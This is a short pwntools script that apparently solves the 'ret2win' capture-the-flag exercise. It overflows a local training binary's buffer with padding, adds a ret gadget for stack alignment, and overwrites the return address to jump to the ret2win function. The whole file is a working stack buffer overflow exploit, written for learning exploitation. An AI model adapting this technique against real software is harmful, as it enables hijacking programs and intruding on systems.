from pwn import *

context.terminal = ["wezterm", "start", "--"]
context.log_level = "debug"

p = process("./ret2win")
gdb.attach(p, api=True)
e = ELF("./ret2win")
rop = ROP(e)

# 0x400756 <ret2win>

payload = b"A" * 32
payload += b"B" * 8  # Saved RBP
# Insert a one‑byte `ret` gadget to fix 16‑byte stack alignment.
# Flow: when the function returns, this `ret` executes first (it's the saved RIP),
# pops the next quadword off the stack, and loads it into RIP—so execution
# immediately jumps to ret2win.
payload += p64(rop.find_gadget(["ret"]).address)
payload += p64(e.symbols["ret2win"])

p.sendafter(b"> ", payload)
p.recvall()
